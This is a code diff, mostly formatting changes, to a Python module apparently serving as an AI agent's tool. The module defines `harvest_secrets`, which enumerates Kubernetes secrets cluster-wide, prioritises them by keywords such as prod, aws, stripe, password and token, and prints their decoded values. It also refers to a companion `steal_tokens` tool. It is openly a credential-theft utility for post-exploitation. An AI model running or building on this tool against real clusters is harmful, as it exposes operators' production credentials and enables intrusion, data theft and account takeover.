@@ -1,6 +1,6 @@
 import base64
-from kubernetes.client.rest import ApiException
 
+from kubernetes.client.rest import ApiException
 
 SKIP_TYPES = [
     "kubernetes.io/dockerconfigjson",
@@ -9,19 +9,64 @@ SKIP_TYPES = [
 ]
 
 INTERESTING_NAMES = [
-    "prod", "production", "db", "database", "api", "admin",
-    "root", "master", "credentials", "secret", "token",
-    "aws", "gcp", "azure", "github", "stripe", "key",
-    "password", "auth", "access", "private", "cert",
-    "tls", "ssl", "vault", "deploy", "ci", "cd",
+    "prod",
+    "production",
+    "db",
+    "database",
+    "api",
+    "admin",
+    "root",
+    "master",
+    "credentials",
+    "secret",
+    "token",
+    "aws",
+    "gcp",
+    "azure",
+    "github",
+    "stripe",
+    "key",
+    "password",
+    "auth",
+    "access",
+    "private",
+    "cert",
+    "tls",
+    "ssl",
+    "vault",
+    "deploy",
+    "ci",
+    "cd",
 ]
 
 INTERESTING_KEYS = [
-    "password", "passwd", "secret", "token", "key", "api",
-    "credential", "auth", "private", "access", "database",
-    "db", "url", "connection", "dsn", "jwt", "bearer",
-    "aws", "gcp", "azure", "github", "gitlab", "stripe",
-    "sendgrid", "twilio", "slack", "webhook",
+    "password",
+    "passwd",
+    "secret",
+    "token",
+    "key",
+    "api",
+    "credential",
+    "auth",
+    "private",
+    "access",
+    "database",
+    "db",
+    "url",
+    "connection",
+    "dsn",
+    "jwt",
+    "bearer",
+    "aws",
+    "gcp",
+    "azure",
+    "github",
+    "gitlab",
+    "stripe",
+    "sendgrid",
+    "twilio",
+    "slack",
+    "webhook",
 ]
 
 
@@ -53,7 +98,7 @@ def harvest_secrets(k8s, namespace: str = "all") -> str:
         return f"Kubernetes API error: {e.status} {e.reason}"
 
     interesting = []
-    boring      = []
+    boring = []
 
     for secret in secret_list.items:
         if secret.type in SKIP_TYPES:
@@ -68,16 +113,9 @@ def harvest_secrets(k8s, namespace: str = "all") -> str:
     total = len(interesting) + len(boring)
 
     if total == 0:
-        return (
-            "No secrets found.\n"
-            "Note: SA tokens are handled by steal_tokens. "
-            "Docker pull secrets and bootstrap tokens are skipped."
-        )
+        return "No secrets found.\nNote: SA tokens are handled by steal_tokens. Docker pull secrets and bootstrap tokens are skipped."
 
-    lines = [
-        f"Found {total} secret(s) — "
-        f"{len(interesting)} high priority, {len(boring)} low priority.\n"
-    ]
+    lines = [f"Found {total} secret(s) — {len(interesting)} high priority, {len(boring)} low priority.\n"]
 
     # ── High priority ─────────────────────────────────────────────────────────
     if interesting:
@@ -86,14 +124,14 @@ def harvest_secrets(k8s, namespace: str = "all") -> str:
         lines.append(f"{'═' * 55}\n")
 
         for secret in interesting:
-            ns    = secret.metadata.namespace
-            name  = secret.metadata.name
+            ns = secret.metadata.namespace
+            name = secret.metadata.name
             stype = secret.type or "Opaque"
 
             lines.append(f"  ⚠ {ns}/{name} ({stype})")
             for key, val in secret.data.items():
                 decoded = _decode(val)
-                marker  = " ◄ INTERESTING" if _is_interesting_key(key) else ""
+                marker = " ◄ INTERESTING" if _is_interesting_key(key) else ""
                 lines.append(f"    {key}: {decoded}{marker}")
             lines.append("")
 
@@ -104,15 +142,11 @@ def harvest_secrets(k8s, namespace: str = "all") -> str:
         lines.append(f"{'─' * 55}\n")
 
         for secret in boring:
-            ns    = secret.metadata.namespace
-            name  = secret.metadata.name
+            ns = secret.metadata.namespace
+            name = secret.metadata.name
             stype = secret.type or "Opaque"
 
-            interesting_keys = {
-                k: _decode(v)
-                for k, v in secret.data.items()
-                if _is_interesting_key(k)
-            }
+            interesting_keys = {k: _decode(v) for k, v in secret.data.items() if _is_interesting_key(k)}
 
             if interesting_keys:
                 lines.append(f"  ~ {ns}/{name} ({stype})")
@@ -148,13 +182,8 @@ definition = {
         ),
         "parameters": {
             "type": "object",
-            "properties": {
-                "namespace": {
-                    "type": "string",
-                    "description": "Namespace to harvest from, or 'all' for cluster-wide."
-                }
-            },
-            "required": []
-        }
-    }
+            "properties": {"namespace": {"type": "string", "description": "Namespace to harvest from, or 'all' for cluster-wide."}},
+            "required": [],
+        },
+    },
 }
